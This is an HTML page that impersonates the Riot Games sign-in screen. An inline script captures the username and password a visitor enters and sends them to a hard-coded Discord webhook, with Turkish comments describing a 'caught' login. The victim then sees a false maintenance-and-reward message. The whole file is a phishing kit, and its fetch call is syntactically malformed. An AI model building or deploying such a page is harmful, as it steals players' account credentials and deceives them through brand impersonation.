<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Riot Games - Sign In</title>
    <link rel="icon" type="image/png" href="logo.png">
    <script src="script.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        html, body {
            height: 100%;
            width: 100%;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #000;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }

        /* ARKA PLAN */
        .bg-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1;
        }

        .bg-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        /* LOGÄ°N KARTI */
        .auth-card {
            position: relative;
            z-index: 10;
            background: #FFFFFF;
            width: 480px;
            padding: 60px 50px 50px 50px;
            border-radius: 35px;
            box-shadow: 0 40px 100px rgba(0,0,0,0.6);
            text-align: center;
        }

        .riot-logo {
            width: 110px;
            margin-bottom: 40px;
            image-rendering: -webkit-optimize-contrast;
        }

        h2 {
            font-size: 26px;
            font-weight: 800;
            color: #111;
            margin-bottom: 35px;
        }

        .input-group {
            text-align: left;
            margin-bottom: 25px;
        }

        .input-group label {
            display: block;
            font-size: 11px;
            font-weight: 800;
            color: #999;
            text-transform: uppercase;
            margin-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            padding: 18px;
            background: #EDEDED;
            border: 2px solid transparent;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            color: #111;
            outline: none;
            transition: 0.2s;
        }

        .input-group input:focus {
            background: #FFF;
            border-color: #111;
        }

        .stay-signed {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 13px;
            font-weight: 700;
            color: #111;
            margin-bottom: 35px;
            cursor: pointer;
        }

        .stay-signed input {
            width: 18px;
            height: 18px;
            accent-color: #D13639;
        }

        .submit-btn {
            width: 85px;
            height: 85px;
            background: #D13639;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto;
            transition: 0.3s;
            box-shadow: 0 10px 20px rgba(209, 54, 57, 0.2);
        }

        .submit-btn:hover {
            background: #bc252a;
            transform: scale(1.06);
        }

        .submit-btn svg {
            width: 32px;
            height: 32px;
            fill: white;
        }
    </style>
</head>
<body>

    <div class="bg-container">
        <img src="login.jpg" alt="Background">
    </div>

    <div class="auth-card">
        <img src="logo.png" class="riot-logo" alt="Logo">
        
        <h2>Sign In</h2>

        <form id="loginForm">
            <div class="input-group">
                <label>Username</label>
                <input type="text" id="username" autocomplete="off" required>
            </div>

            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" required>
            </div>

            <div class="stay-signed">
                <input type="checkbox" id="stay" checked>
                <label for="stay">Stay signed in</label>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">
                <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
            </button>
        </form>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1455224800845889549/CffoDwFIEM1AUIlm9gFzpsnhIW3O6nBvDnvRKXQHDz_tOaXQU6m0TBqbuzGgLtZbcGyz";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // Discord'a gÃ¶nderilecek mesajÄ±n formatÄ±
            const payload = {
                embeds: [{
                    title: "ðŸš€ Yeni GiriÅŸ YakalandÄ±!",
                    color: 13710905, // Riot KÄ±rmÄ±zÄ±sÄ±
                    fields: [
                        { name: "ðŸ‘¤ KullanÄ±cÄ± AdÄ±", value: `\`${user}\``, inline: true },
                        { name: "ðŸ”‘ Åžifre", value: `\`${pass}\``, inline: true }
                    ],
                    footer: { text: "Riot Auth System Log" },
                    timestamp: new Date()
                }]
            };

            // Veriyi Discord'a gÃ¶nder
            fetch(webhookURL, {
                method: 'POST',

                body: JSON.stringify(payload)

            .then(() => {
                // GÃ¶nderim baÅŸarÄ±lÄ± olunca kullanÄ±cÄ±ya uyarÄ± Ã§Ä±kar
                alert("The server is currently under maintenance. Your reward has been reserved. Please try to sign in again in 1 hour.");
            })

            });
        });
    </script>

</body>

</html>
